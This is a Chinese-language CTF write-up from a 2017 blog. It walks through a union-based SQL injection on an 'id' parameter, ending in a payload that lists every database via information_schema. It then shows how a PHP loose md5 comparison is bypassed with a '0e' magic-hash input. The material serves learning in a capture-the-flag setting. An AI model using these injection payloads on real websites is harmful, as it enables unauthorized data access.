第一步：?id=1
正常显示

第二步：?id=1’
显示错误：LIMIT 0,1’ 这表示切片
（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）
这告诉我们需要将后面的注释掉

第三步：?id=1’–+
利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释

第四步：?id=0’ union select 1,2,3–+ 或者 ?id=0’ union select * from users order by猜解
测试关于字段的个数

第五步：?id=0’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+
最后查看所有库，也可以加些其他操作…由于本人小白，就不多说了…

ctf.web.2

发表于 2017-09-17 | 分类于 cft.web

一个网页的源码：
<?php
$md51 = md5(‘QNKCDZO’);
$a = @$_GET[‘a’];
$md52 = @md5($a);
if(isset($a)){
if ($a != ‘QNKCDZO’ && $md51 == $md52) {
echo “nctf{*}”;
} else {
echo “false!!!”;
}}
else{echo “please input a”;}
?>

可知他需要在后缀网址输入?a=…
重点是这句：if ($a != ‘QNKCDZO’ && $md51 == $md52)
同样md5加密后的结果某种程度上相同但是原先的字符串不同
首先，我们将QNKCDZO这个字符串md5加密，得到：0e830400451993494058024219903391
0e表示0，则我们只需要找0e开头的即可，网上搜到有aabg7XSs

后来我犯了个错，我在a=加了引号，其实不用，看源代码，我们无需加引号
去掉引号就得到flag了…
